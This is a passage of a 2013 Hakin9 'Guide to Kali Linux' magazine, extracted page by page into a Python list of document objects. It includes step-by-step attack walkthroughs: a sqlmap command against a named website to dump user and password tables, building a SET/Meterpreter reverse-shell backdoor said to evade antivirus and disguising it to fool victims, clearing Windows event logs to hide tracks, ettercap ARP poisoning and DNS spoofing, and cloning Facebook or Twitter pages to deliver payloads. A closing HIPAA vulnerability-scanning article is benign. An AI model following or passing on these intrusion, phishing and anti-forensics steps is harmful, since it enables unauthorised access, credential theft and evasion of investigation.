              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 20}, page_content='www.hakin9.org/en 21Weaponization of Android Platform  using Kali Linux \\n*Note: Kali ile requires permissions to be an exe -\\ncutable and we can set it using this command irst:\\nChmod 755 /sdcard/kali/kali\\nthen use this command to run Kali\\nsu -c /sdcard/kali && sh kali\\nOptional 01\\nTerminal Emulator can be configured to start the \\nsession directly in the Kali chroot environment by \\nadding the following command in: Preferences >> \\nInitial Command\\nsu -c “cd /sdcard/kali && sh kali”\\nOptional 02\\nUpdate the distribution by using the following com -\\nmand:\\napt-get update && apt-get upgrade && msfupdate\\nOptional 03\\nEnhance functionality by adding below mentioned \\ntools from app store.\\nSummary\\nKali Linux GUI or CLI both are equally powerful \\nwhen combined with Android Platform. The begin -\\nners can start using kali GUI on mobile device and \\nthe more experienced who are comfortable with the \\nterminals can have fun using kali CLI. In the future, \\nmore mobile-based tools and apps are going to \\nflood the markets and we need to start using mobile \\ndevices and smartphones as they and becoming \\ninexpensive and more functional. Hope this article \\nis helpful, informative and encourages you towards \\nthe field of cyber security and pentesting.\\nDANIeL SINgH\\nDaniel Singh (CEH, ECSA) is Cyber-securi -\\nty consultant and prominent speaker at \\nDefcon Indian Regional Chapters. He has \\nover thirteen years of experience in scien -\\ntiic software development, network/da -\\ntabase administration, business & data \\nanalysis. He has worked in various roles, i.e.; coding, testing, \\ndatabase and network administration to senior analyst. Cur -\\nrently he works as an Independent consultant in network and \\nsystems security. Apart from consulting, he is active in train -\\ning & mentoring upcoming security professionals. He has var -\\nied interests including malware analysis, open source intelli -\\ngence gathering, reversing, ofensive security and hardware \\nhacking. Email: Daniel@techngeeks.com\\n Figure 12.  Metasploit in Kali chroot\\nFigure 11.  Kali chroot prompt\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 21}, page_content='Extra 03/2013 22AT TACK\\nTable 2. Tools for enhancing functionality\\nApp Name Description\\nAndFTP ftp/sftp client\\nAndroid Hackers shows complete android info\\nAndroidVNC  vnc viewer client\\nAndSMB Android Samba client\\nAntennas shows mobile antennas and much \\nmore info\\nAnyTAG NFC \\nLauncher Automate your phone by scanning \\nNFC tags\\nAPG OpenGPG for Android\\nAPK Dumper copies apk of selected apps\\nApp List Backup says what it does\\nBugtroid pentesting and forensics\\nCardTest Test your NFC enabled credit cards\\nChecksum GUI tool for md5sum and shasum tools\\nConnectBot powerful ssh client\\nDNS Lookup perform DNS and WHOIS lookups\\nDolphin Browser browser that easily allows you to \\nchange your UserAgent\\nDroidcat inspired by irecat\\nDroidsheep Security analysis in wireless \\nnetworks\\nDroidsheep Guard app for monitoring Androids ARP-table\\nDroidSQLi automated MySQL injection tool\\ndSploit Android Network Penetration Suite\\nElectronic \\nPickpocket wirelessly read NFC enabled cards\\nExif Viewer shows exif data from photos and can \\nremove this information\\nFast notepad simple but useful notepad \\napplication\\nFind My Router’s \\nPassword title explains it all (mostly for default \\npasswords)\\nFing very similar to Look@LAN tool for \\nWindows\\nGoomanager front end for android ile hosting\\nHacker’s Keyboard as the name says\\nHashPass translate text into hashes\\nHex Editor hex editor for Android\\nHex Pirate hex editor for Android\\ninSSIDer wireless network info\\nintercepter-NG mutli-function network tool, snifer, \\ncookie intercepter, arp poisoner\\nIP info Detective detailed information regarding the \\nIP address\\nIP Webcam Android device into an IP security \\ncamera\\nLoggy view your logcat in your desktop browserMaluuba voice activated assistant\\nnetwork \\ndiscoveryComputer/device discovery and port \\nscanner\\nNetwork Signal Info graphical tool for iwconig\\nnetwork tools periodic monitoring of websites, \\nservers, routers, surveillance \\nsystems, etc\\nNFC ReTAG Re-use write protected NFC Tags \\nsuch as hotel key-cards, access \\nbadges, etc\\nNFC TagInfo another NFC reader\\nobackup Easily backup your entire device to \\nthe cloud in one tap\\nOpenVPN Connect open vpn client\\nOrbot tor on Android\\nPacket Injection poorman’s GUI version of scapy\\nportknocker as name says\\nProxyDroid use your socks5 proxy with this \\napplication\\npython for \\nandroidas name says\\nrekey app that ixes the recently-disclosed \\n“Master Key” vulnerabilities\\nRoot Browser great ile manager for Android\\nSandroProxy kind of like Webscarab\\nScreenshot \\nUltimate to take screenshots\\nSecret Letter poorman’s stegonagraphy tool\\nsmanager script manager\\nsmart taskbar as name says\\nSSHDroid openssh server for android\\nSTUN Client app to ind out what kind of irewall/\\nNAT you’re behind by using the \\nSTUN protocol.\\nSU Update ixer as name says\\nSupersu manage what programs access root \\nfunctions\\nTeamviewer remotely control Windows, OSX, and \\nLinux based systems\\nTerminal Emulator no explanation needed\\ntimely alarm\\ntPacketCapture as name says\\nVirusTotal Uploader test your malicious payloads\\nVoodoo OTA \\nRootKeeper maintain root access even after \\nupdates\\nWii File Transfer access iles on your phone from a \\nweb browser via an http server\\nWiiFinder simple wireless scanner\\nWiGLE Wii Open-source wardriving app\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 22}, page_content=''),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 23}, page_content='Extra 03/2013 24AT TACK\\nKali Linux is probably one of the distributions \\nmore complete for the realization of pene -\\ntration test. This is accompanied by many \\ntools of all kinds. In this article we’ll see some ex -\\namples on how to perform attacks using only some \\nof the Top Ten tools of Kali Linux focusing on those \\nthat are designed to attack web servers...\\nGenerally an attack is performed as follows:\\n•  Collection/information gathering.\\n•  Anonymity.\\n•  Search vulnerabilities.\\n•  Exploitation of the systems.\\n•  Post exploitation.\\n•  Elimination of proofs.\\n•  Executive and technical report.\\nWe will focus on the following: Information Gath -\\nering, search vulnerabilities, exploitation and Post \\nexploitation .\\nIt is important to know that:  in this article you are \\nworking with a series of tools for a specific pur -\\npose, but this does not mean that the tool can only \\nbe used for this purpose. The vast majority of the \\ntools have multiple uses.\\nNmap: Information gathering\\nWhen we are ready to perform an attack, the first \\nand most important step is the collection of infor -mation. Knowing all the potential weak points is \\nour goal. To do this the first thing that we are going \\nto do is to conduct a port scan with nmap. In this \\nway we will know what type of services or applica -\\ntions run under the web server.\\nAs shown in Figure 1, we see the result of a basic \\nscanning launched from nmap , more specifically  Kali Linux, Attacking \\nServers\\nThis article will show you how to perform attacks on web \\nservers, getting full access to the system and database. Just \\nby using some of the ‘Top Ten’ tools of Kali Linux.\\nFigure 1.  Result of scan with Zenmap. Multiples open ports\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 24}, page_content='www.hakin9.org/en 25Kali Linux, Attacking Servers\\nfrom Zenmap , the graphical version of nmap. The \\nscan showed a few open ports on the server, and \\nthis may give us some clues as to where to find \\npotential vulnerabilities. The information which has \\ntaken us back is quite juicy, the server that we are \\nattacking has more of a role assigned, therefore \\nmore points to that attack.Some of the services that are attacked :\\nPort 21 FTP\\nPort 110 pop3\\nPort 3306 mysql\\nThese will probably be the most vulnerable, be -\\ncause the rest of which ports are open on the serv -\\ner have a connection with the security type SSL or \\nTLS, as is the case of HTTPS, SMTPS, POP3S \\nor of the SSH. These protocols and their connec -\\ntion, have a very robust encryption, which is why it \\nis more complex to obtain a key using brute force, \\nor crack a password snifing the trafic on a LAN.\\nAs an example; both by the port 21 as the 110 \\ncould be attempting to perform a brute-force at -\\ntack. On the other hand, we have port 3306 that \\ntells us that mysql installed.\\nWe will do some checking typical to perform a pen -\\netration test, such as trying to access an anonymous \\nuser FTP, or verify access to mysql is enabled.\\nIn Figure 2, shows how the mysql Backend can \\nonly be accessed from within the LAN itself. \\nHowever, having a mysql installed and see so \\nmany open ports makes us think that the web that \\nwe are attacking have more than one database \\ndedicated to various services, for example, for the \\nmain page, a database, for the blog other, and so \\non for each part of the web. This can mean that \\nsome of the parts of the web page is vulnerable.\\nOWASP: Search vulnerabilities\\nOnce that we have some information on the objec -\\ntive, the next step will be to seek vulnerabilities with \\nFigure 2.  Acces denied for mysql backend\\nFigure 3.  Automatic full scan with OWASP ZAP\\nFigure 4.  Report in html from OWASP\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 25}, page_content='Extra 03/2013 26AT TACK\\nthe OWASP tool. At the time of use OWASP we \\ncan use this of two different ways. The first of them \\nwould be to use OWASP as a proxy in our browser, \\nintercepting and all the connections that are made \\nwith Firefox, Chrome, or any other browser.\\nIn this way we can establish the attack in a sin -\\ngle point, that is to say, possibly the web to which \\nwe are attacking has multiple URL, between the \\nBLOG, the main page, the access to the extranet, \\naccess to suppliers, and so on using as a proxy \\nOWASP interceptions exclusively part of the web \\nserver that we want to attack.The other way to use OWASP to search for vul -\\nnerabilities is doing a full scan of the web site.\\nLater I’ll show you how to do it. This option is \\nless advised that the previous one, however, can \\nhelp us in the time to search for these vulnerabili -\\nties, this method is faster. It is less advisable to use \\nthis method, or better said, the handicaps of using \\nas a proxy is, that if you do a full scan on a web -\\nsite, OWASP runs through all the URL of the page \\nand tries to find vulnerabilities in each of the par -\\nties of the web. This implies that the IDS or firewall \\nof server to that we are attacking can detect an in -\\ntrusion attempt.\\nOWASP when perform a full scan, launches all \\npossible attacks, grouping the vulnerabilities found \\nbased on their criticality.\\nIn the image below (Figure 3) we see the result \\nobtained by OWASP on a full scan of the web site \\nthat we are attacking.\\nOnce that we already have the result of the scan -\\nning, the most advisable is to perform a first look \\nat the potential vulnerabilities, and then export it in \\n.HTML in order to be able to focus on those vulner -\\nabilities that we are the most interested in.\\nFigure 4 is the result already exported and in de -\\ntail on the vulnerabilities found. \\nOne of the vulnerabilities found was a XSS (cross \\nsite scripting) and to exploit it is as simple as go \\nto the browser and insert the URL which showed \\nOWASP. Figure 5, is the result of XSS.\\nFigure 8.  Results of the table containing the passwords\\n Figure 7.  Results of the table containing the users\\nFigure 6.  Showing the databases with sqlmap\\nFigure 5.  XSS (cross site scripting) exploited\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 26}, page_content='www.hakin9.org/en 27Kali Linux, Attacking Servers\\nSQLmap: exploiting vulnerabilities\\nAfter verifying that the fault discovered by OWASP \\nare exploitable, we spent a sqlmap where we en -\\ntered a field a bit more fun.\\nAmong other vulnerabilities, we found a possible \\nfailure of SQL injection.\\nThe first thing is to check whether there is such \\nfailure by entering the URL that showed us OWASP.\\nKnowing that is vulnerable, we used sqlmap tool \\nto automate the processes of SQL injection.\\nThe same as it happens with OWASP, there are \\ntwo ways to use sqlmap, one of them would be us -ing the wizard, and the other entering the param -\\neters one by one.\\nFor example: we’d use the following command to \\nknow which are the DATABASE of server (Figure 6).\\nsqlmap -u http://www.website.es/actualidad/evento.\\nphp?id=110 --level=5 --lush-session –dbs\\nThen the options that we offer sqlmap, would get \\nthe tables from a database, after, then users, and \\nso on up to obtain the passwords. It could even \\nmake a dump of all the DB.\\nSometimes the users and passwords are in dif -\\nferent tables, however this is not a problem, we \\ncannot continue with the process of intrusion. Fig -\\nures 7 and 8 show the users and passwords in dif -\\nferent tables.\\nTo do a dump of these two tables, we get the \\naccount_id  and the password (Figure 9), which in \\naddition, seeing the user name I suppose it is the \\nuser that gives access to the FTP.\\nAnd as we saw earlier, one of the open ports was \\nprecisely the 21. Thus, we tried to enter and ... \\nWe’re already inside!\\nNavigating a little for folders on the ftp we realize \\nthat the website has a blog with Wordpress (Figure \\n10). This makes it easier for us once more to get \\naccess to the system ...\\nWe downloaded the file wp-config to view the \\nuser that connects with the Wordpress Database, \\nand we try to connect to a mysql client (Figure 11).\\nSummary\\nWith only 3 programs we have obtained full access \\nand with root permissions to Mysql. Also, we have \\nhad access to the FTP server where are housed all \\nof the files of the web site, and where we could get \\na remote shell.\\nThese 3 tools are in the Top Ten of Kali Linux. These \\nare without doubt the tools to be considered in order \\nto make hacking attacks and penetration testing.\\nISMAeL gONzáLez D.\\nIsmael Gonzalez D. is a security research -\\ner with an experience of over 7 years in the \\nstudy of web vulnerabilities. He is currently \\ncertiied in CEH, MCP, MCDTS, MCSA, LPIC-1. \\nFounder and publisher of computer securi -\\nty blog (http://kontrol0.com). Writer of the \\nbook Backbox 3 – Initiation to pentesting, \\nfreely distributed and completely free (http://www.scribd.com/\\ndoc/157067606/BackBox-3-Iniciacion-al-Pentesting).\\nFigure 9.  Dump of users data and passwords\\nFigure 11.  Full access to the Mysql Server with mysql client\\nFigure 10.  Full access to the FTP server\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 27}, page_content='Extra 03/2013 28AT TACK\\nBackdoor is a security hole that can exist in a \\ncomputer program or operating system that \\ncould allow the invasion of the system so \\nthat the attacker can get a full control of the ma -\\nchine.\\nReferring to a backdoor, this is a ‘backdoor’ that may be exploited via the Internet, but the term can \\nbe used more broadly to describe ways of stealthy \\nobtaining privileged information systems of all \\nkinds.\\nThere are cases where the computer program \\ncan contain a ‘backdoor’ implemented at the time it Hands-on: How To \\nCreate ‚Backdoor’ \\nTo Remote Access With Kali Linux\\nNow I will introduce you to a technique that will use SET \\n(social engineering toolkit) available in Linux Kali ...\\nLet’s create a backdoor that can be used to remotely control \\na Windows computers.\\nWe will create an executable legitimate, hardly detected by \\nany antivirus, so we complete a computer target.\\nI want to point out that all the information here should be \\nused for educational purposes or penetration test, because \\nthe invasion of unauthorized devices is crime.\\nFigure 3.  Enter the IP adress, Step 3\\nFigure 2.  Create the Payload and Listener, Step 2\\nFigure 1 . Social Engineering Toolkit, Step 1\\nFigure 4.  Set payload, Step 4\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 28}, page_content=\"www.hakin9.org/en 29Hands-on: How To Create 'Backdoor' To Remote Access With Kali Linux\\nwas compiled. Generally this feature is interesting \\nwhen software must perform update operations or \\nvalidation.\\nStep to Step\\nI hope to do a walkthrough theoretically simple:\\nFirst we access the menu: “Applications/Kali \\nLinux/Exploitation Tools/Social Engineering Tool -\\nkit” and click “seetoolkit”. It will be a menu like that \\nseen in the Figure 1. In the options menu select \\noption 1.\\nIn the second menu select option 4 (Figure 2).\\nIn this screen below you should properly input \\nyour IP address. If you have questions open a new \\nterminal and type ifconfig eth0  then fill in this field \\ncorrectly (Figure 3).\\nIn the screenshot below, you should choose the \\nsecond option to create a connection reverse, our target computer is who will connect to the attack -\\ner (Figure 4). In the screenshot below to watch 3 \\nsteps we perform first the kind of backdoor, type \\n16, then we must define the portal site, the attack -\\ner’s machine that will be ‘listening’ for connection \\nattempts made   by the target. The default port is \\n443 you can choose to change the port if it is al -\\nready being used. We can enter another number \\nand then press ‘Enter’, Next you’re asked whether \\nto start ‘listening’, you must enter ‘yes’ (Figure 5).\\nWith these procedures the ‘backdoor’ will be cre -\\nated and our computer will begin to ‘listen’ for con -\\nnections from the target machines.\\nThe executable is created in the folder /usr/\\nshare/set/  and is called ‘msf.exe‘.\\nThe goal is to make it an executable, then we \\ncan open a new terminal and type the following \\ncommand\\n‘chmod + x / usr / share / set / msf.exe‘\\nFigure 6.  Starting interaction, Step 6\\nFigure 5.  Start the listener, Step 5\\nFigure 8.  Ettercap, Step 2\\nFigure 7. Ettercap, Step 1\\n Figure 9.  Ettercap, Step 3\\n\"),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 29}, page_content='Extra 03/2013 30AT TACK\\nIf you want to you can rename this ile to facil -\\nitate the process of social engineering to con -\\nvince someone to opening a photo or install a \\nnew application.Now we need to copy this executable to the tar -\\nget machine and so it runs a Figure 6.\\nHere to enter the command ‘sessions’ can list the \\ntargets already connected.\\nWhen we type ‘sessions -i 1’ (assuming 1 is the \\nID number displayed by the command ‘sessions‘, if \\nanother number is displayed just change the num -\\nber shown by 1)  we will be able to interact with the \\ntarget machine with full access.\\nDNS spoofing attack with ettercap\\nINTRODUCTION\\nDNS spoofing is a method in which the attacker com -\\npromises a name server (Domain Name System).\\nThe server accepts and incorrectly uses the in -\\nformation from a ‘host’ who has no authority to pro -\\nvide this information.\\nUsing this technique, the attacker can direct the \\nvictim’s browser or email to their own server.\\nThe technique consists of the data that is entered \\nin a Domain Name System (DNS) ‘name server’s \\ncache database’, making the name of the server to \\nreturn an incorrect IP address, diverting traffic to \\nanother computer.\\nStep to Step\\nOpen the terminal. Type and hit enter (Figure 7): \\nFigure 10.  Start Sniing, Step 4\\nFigure 11.  DNS Spoof, Step 5\\nFigure 12.  Social Engineering Toolkit, Step 1\\nFigure 13.  Social Engineering Attacks, Step 2\\nFigure 14.  Website Attacks, Step 3\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 30}, page_content=\"www.hakin9.org/en 31Hands-on: How To Create 'Backdoor' To Remote Access With Kali Linux\\n# vi /usr/share/ettercap/etter.dns\\nJust edit and save, exit and enter after ‘ettercap-\\nG’ to open Ettercap in graphical mode.\\nGo Sniff: ‘Unified Sniffing’, when prompted, \\nchoose your NIC ‘eth0’ (Figure 8).\\nConcepts\\nThis type of attack is important to get some creden -\\ntials during the execution of the penetration test. It \\nconsists of sending false answers to DNS requests \\nthat are made. To execute this attack, you must ed -\\nit the file ‘etter.dns’, as it is the file ‘hosts’ windows \\nand linux, we can configure to which requests are \\nsent. In ‘Hosts’ click ‘Scan for hosts’.\\nAgain in “Hosts” click Host List ‘to view a list of all \\navailable IPs on the network, which will select the \\ntarget that will receive the false answers and click’ \\nAdd to Target 1’ (Figure 9).\\nNow click on ‘Start’, ‘Start Sniffing’.\\nAfter go ‘MitM’: ‘Arp Poisoning’. Select the option \\n‘Sniff remote connections’ as below and click ‘OK’ \\n(Figure 10).\\nGo to ‘Plugins’, ‘Manage the Plugins’ and double \\nclick dns_spoof’ (Figure 11).\\nDone that the ‘selected customer’ will start get -\\nting false answers to DNS.Cloning Site with Kali Linux\\nINTRODUCTION\\nSET Attack Method:\\nThe Social Engineer Toolkit (SET) has been de -\\nveloped to perform advanced attacks against the \\nhuman element. SET was designed to be launched \\nwith http://www.social-engineer.org  and quickly \\nbecame a standard tool in the arsenal of penetra -\\ntion testers. The attacks built into the toolkit are de -\\nsigned to be focused on attacks against a person \\nor organization used during a penetration test.\\nThis hacking method will work perfectly with the \\n‘DNS spoofing or Man in the Middle attack method’.\\nI will present methods of attack like this can have \\ncomputer in few steps.\\nStep to Step\\nEnter on Applications: Kali Linux: Exploitation \\nTools: Social Engineering Toolkit: then Select ‘se-\\ntoolkit’ (Figure 12).\\nFigure 15.  Java Applet Attack, Step 4\\nFigure 16. Site Cloning, Step 5\\nFigure 17.  Web Templates, Step 6\\nFigure 18.  URL to be cloned, Step 7\\n\"),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 31}, page_content='Extra 03/2013 32AT TACK\\nThen Select option ‘Social Engineering Attacks’ \\nusing no. So it will create another window: Fig -\\nure 13. Then Select option ‘Website Attack Vec -\\ntors’ which is the unique way of using multiple web \\nbased attacks... (Figure 14).\\nAfter that Select option ‘Java Applet Attack’ \\nmethod will spoof a Java Certificate and deliver a \\n‘metasploit’ based payload (Figure 15).Select the option which is for ‘Site Cloning’ that \\nwill allow SET to clone the Site that you will define \\nso that it can utilize that attack (Figure 16).\\nAfter pressing enter on the ‘Web Template’ will \\nshow how to use the PORT/ NAT or other. Next \\nstep, enter the IP of your Kali linux, so you can do \\nreverse connection to your machine when the tar -\\nget using the link provided by you (Figure 17).\\nAfter you provide the URL to be cloned as Ya -\\nhoo, Twitter, Facebook. You can collect various in-\\nformation about the target (Figure 18).\\nProvide the URL to start cloning, and then, once \\nthat’s done, will start generating ‘payload’ and \\nsome files as jar file, index.html (Figure 19).\\nSelect the ‘payload’ necessary that you want to \\ngenerate. I’m using the second option, which is the \\n‘Windows Meterpreter Reverse_TCP’ that will cre -\\nate a shell access between the attacker and the \\ntarget machine that is between my Kali Linux (Fig -\\nure 20). It will display ‘list of Encoding’s’ that will \\nhelp you bypass the security target. I prefer ‘Back -\\ndoored Executable’, it is best to find a ‘spamhole’ \\non the machine in question (Figure 21).\\nWill begin to generate multiple ‘Powershell code \\nbased Injection’ based on common ports such as \\n Figure 19. Generating Payload, Step 8\\nFigure 20.  Windows Meterpreter Reverse_TCP, Step 9\\nFigure 21.  Backdoored Executable(BEST), Step 10\\nFigure 22.  Powershell, Step 1 1\\nFigure 23.  Reverse TCP Connection, Step 12\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 32}, page_content=\"www.hakin9.org/en 33Hands-on: How To Create 'Backdoor' To Remote Access With Kali Linux\\n53, 80, 443, in his ‘Attacket machine’ to the target \\nusing one where the ‘payload’ is generated.\\nSelect Option 16, will ask for the ‘Port Number’. \\nPress Enter then it will use the default port number. \\nIt will launch the ‘Launch the Web SET’ will start \\nappearing and the number of vulnerabilities and \\nthen it will generate a link that you can move on \\nto the target and once he uses that link, your ma -\\nchine will create a connection ‘Reverse TCP Con -\\nnection ‘ with the attacker’s machine on the num -\\nber of doors (Figure 23).\\nThe Code execution ‘ PowerShell ‘, which will run \\nin the background and then will load ‘ MSF ‘ and \\ngenerate a ‘link’ that when a person clicks it will \\ncreates reverse connection open to you within the \\nnetwork (Figure 24).\\nThis will provide a link when trying to open the \\ntarget, all the information from your system back to us via ‘ Reverse TCP Connection’ (Figure 25). \\nWhile one tries to use this link will generate a con -\\nnection on some port between the attacker and the \\ntarget, which is ‘TCP’. After these procedures the \\n‘payload‘ is generated and when you use this link \\non the machine to open a cloned page also gener -\\nates the file ‘.jar‘ whose function is to establish the \\nconnection between the two machines (Figure 26).\\nLet’s create a session with the machine, going \\nto my local machine can check if the connection \\nwas successful or not. We should use the com -\\nmand ‘netstat’.\\nExample: netstat-year | find “57804”.\\nWhen we are connected to the target machine, \\nyou can run many programs and can edit the files.\\nRun ‘Event Viewer’ and remove all notifications, \\nso it becomes more difficult to track what is hap -\\npening with the machine.\\nAlthough we can trace the connection estab -\\nlished with the command “sessions-l”.\\nAfter running the command will start sending \\n‘HTTP packets’ to the target machine via the ‘GET \\nmethod’.\\nThis shows that the connection has been estab -\\nlished with the machine.\\nYou can use utilities such as Restart, Shutdown \\nthe system.\\nIt is worth remembering that I made this article \\nfor educational purposes only, I am totally against \\nthe cybernetic crime, so use it with conscience .\\nRAFAeL FONTeS SOUzA\\nOver the years, acquiring knowledge of \\nWebmaster programmer(HTML5,CSS,XML\\n,ActionScript), developer in languages like \\nPython, Shell Script, Perl, Pascal, Ruby, Ob -\\nject Pascal, C and Java. I started studying \\nwith thirteen (SQL database), i have exten -\\nsive experience in operating systems such \\nas Linux, UNIX, and Windows. I am maintainer of the “project \\nbacktrack team brazilian”, I am also a member of the “French \\nBacktrack Team” and made partnerships with groups from In -\\ndonesia and Algeria; prepared a collection of video lessons \\nand made them available on the website. I have good com -\\nmunication in groups and the general public, attended col -\\nlege projects with a focus on business organization, I am cur -\\nrently seeking for a work experience outside of Brazil”. \\nhttp://sourceforge.net/projects/cypherpunks/ \\nContact: fontes_rafael@hotmail.com \\n Figure 26.  Establish the connection, Step 15\\nFigure 25.  The attack, Step 14\\nFigure 24.  Starting the payload handler, Step 13\\n\"),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 33}, page_content='Extra 03/2013 34DeFeNSe\\nOpen Source solutions can be leveraged as \\na low-cost and effective strategy to mini -\\nmize risk when used as component of a \\nlarger information security program. With a long \\n“track” record of community support, Kali is an \\nopen source Linux distribution containing many \\nsecurity tools to meet the needs of HIPAA network \\nvulnerability scans. \\nNote\\nThis article is not as much a how-to as it is a proof \\nof concept and evaluation of Kali on low-cost hard -\\nware (Raspberry Pi in this case). As such, I will dis -\\ncuss my overall experiences here but will not get \\ninto the weeds of the build process for the scan -\\nner. There are much better resources elsewhere \\nto explain the details of this particular project. In \\nother words, I am not reinventing the wheel here \\nand have borrowed heavily from readily available \\nonline resources. Think of this as more of a busi -\\nness case with some of the technical bits included.\\nAs Senior Consultant for a Managed Service \\nProvider company, I have a need to develop a \\nscalable low-cost solution for performing HIPAA \\nvulnerability scans. The scans will be part of a larg -\\ner Information Security consulting service to assist \\nclients with their HIPAA compliance program. As a \\nBusiness Associate  of Covered Entities (meaning \\n– vendor of medical companies), the security solu -tion will also be used to support the internal com -\\npliance program of our technology firm. \\nThe requirement for risk analysis (and conse -\\nquently vulnerability scans) is explained in the \\nGuidance on Risk Analysis Requirements under \\nthe HIPAA Security Rule  document published by \\nthe US Department of Health and Human Services \\n(http://www.hhs.gov/ocr/privacy/hipaa/administra -\\ntive/securityrule/rafinalguidancepdf.pdf ):\\nRisk Analysis Requirements under the Security \\nRule. The Security Management Process standard \\nin the Security Rule requires organizations to “[i]\\nmplement policies and procedures to prevent, de -\\ntect, contain, and correct security violations.” (45 \\nC.F.R. § 164.308(a)(1).) Risk analysis is one of four \\nrequired implementation specifications that pro -\\nvide instructions to implement the Security Man -\\nagement Process standard. Section 164.308(a)(1)\\n(ii)(A) states: RISK ANALYSIS (Required).\\nConduct an accurate and thorough assessment \\nof the potential risks and vulnerabilities to the confi -\\ndentiality, integrity, and availability of electronic pro -\\ntected health information held by the [organization].\\n…Vulnerability is defined in NIST Special Pub -\\nlication (SP) 800-30 as “[a] flaw or weakness in \\nsystem security procedures, design, implementa -\\ntion, or internal controls that could be exercised \\n(accidentally triggered or intentionally exploited) \\nand result in a security breach or a violation of the Kali Scanning for \\nHIPAA\\nA Proof of Concept: using Kali Linux to deploy distributed \\nnetwork vulnerability scanners for medical clients\\nThe Health Insurance Portability and Accountability Act of \\n1996 (HIPAA) requires organizations who handle electronic \\nProtected Health Information (e-PHI) to take action and \\nreduce risk relative to potential security breaches of digital \\ncommunication and storage of patient information. \\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 34}, page_content='www.hakin9.org/en 35Kali Scanning for HIPAA\\nsystem’s security policy.” Vulnerabilities, whether \\naccidentally triggered or intentionally exploited, \\ncould potentially result in a security incident, such \\nas inappropriate access to or disclosure of e-PHI. \\nVulnerabilities may be grouped into two general \\ncategories, technical and non-technical. Non-tech -\\nnical vulnerabilities may include ineffective or non-\\nexistent policies, procedures, standards or guide \\nlines. Technical vulnerabilities may include: holes, \\nflaws or weaknesses in the development of infor -\\nmation systems; or incorrectly implemented and/or \\nconfigured information systems.\\nProject Requirements\\nA build versus buy approach was taken to evalu -\\nate solutions as a scalable, affordable, and effective \\nmethod of conducting network vulnerability scans. \\nThe result of the scans will address HIPAA risk anal -\\nysis requirements while driving vulnerability remedi -\\nation plans. The final solution must scale with grow -\\ning business demands for security assessments so \\nautomation of distributed scanners was a primary \\nconsideration. Additionally, the scanners must be \\ncost-effective to deploy, easy to manage (more on \\nthis later), and enable centralized reporting.\\nHaving familiarity with the Backtrack Linux distri -\\nbution, Kali was a logical choice for a best of breed \\noffering in the open source community. So what \\nis Kali Linux? According to Kali.org, Kali Linux is \\nan advanced Penetration Testing and Security Au -\\nditing Linux distribution.  It is also a complete re-\\nbuild of Backtrack, its predecessor. Kali is free ( as \\nin beer ) and contains over 300 penetration testing \\ntools. This seems like a good fit for the low-cost re -\\nquirement of the project.\\nTo further control costs, the Raspberry Pi system \\non a chip (SoC) device was selected as the comput -\\ner hardware for the scanners. These tiny computers \\ncan be purchased from a number of distributors for \\n$35.00USD. It must be recognized at this point that \\nchoosing a low-powered device like the RPi is not \\nwithout trade-offs. We are seeking to balance cost, \\nsize, and power efficiency against performance re -\\nquirements and capabilities of the system. That be -\\ning said, it’s hard to argue that a better value can be \\nhad for a distributed network scanner. \\nWhat’s a Raspberry Pi?\\nAccording to the official website ( http://www.raspber -\\nrypi.org/faqs) , “the Raspberry Pi is a credit-card sized \\ncomputer that plugs into your TV and a keyboard. It’s \\na capable little PC which can be used for many of the \\nthings that your desktop PC does, like spreadsheets, \\nword-processing and games. It also plays high-def -\\ninition video. We want to see it being used by kids all over the world to learn programming.” Hardware \\nSpecifications (Raspberry Pi Model B):\\n•  CPU – 700 MHz ARM processor (overclocks to \\n1 GHz)\\n•  Storage – SD card slot\\n•  Memory – 512MB RAM\\n•  Graphics – Broadcom VideoCore IV\\n•  Video Out – Composite RCA and HDMI\\n•  Audio Out – 3.5mm jack \\n•  Networking – 10/100Mbps Ethernet\\n•  I/O Ports – 2x USB\\nFigure 1. Raspberry Pi Model B\\nDesigned as a project computer, the Raspberry Pi \\nappeared to be a good it for our speciic require -\\nments. I followed the documentation on Kali.org \\nfor installing Kali ARM on a Raspberry Pi. Since \\nthis is a proof of concept, an 8GB SDHC Class 10 \\ncard was used for provisioning the operating sys -\\ntem. A production system may require more stor -\\nage for running multiple reporting tools and keep -\\ning a local copy of the scanning history.\\nSome Notes on Installation\\nKali image used for testing: http://cdimage.kali.org/\\nkali-linux-1.0-armel-raspberrypi.img.gz.\\nWhile this is not a Kali/Raspberry Pi installation \\nhow-to, I figured I would at least touch on the un -\\nexpected problems encountered during the initial \\nset up process. It is often said that installing open \\nsource systems is not for the faint of heart. I agree. \\nWhile not always straightforward, a bit of Google-\\nfu usually saves the day…no exceptions here.\\nNote\\nI experienced problems with the kali-linux-1.0.4-\\narmel-rpi.img.gz version of the operating system \\n(the current version) which resulted in the key -\\nboard and mouse locking up in the desktop inter -\\nface. Troubleshooting this issue led me to forum 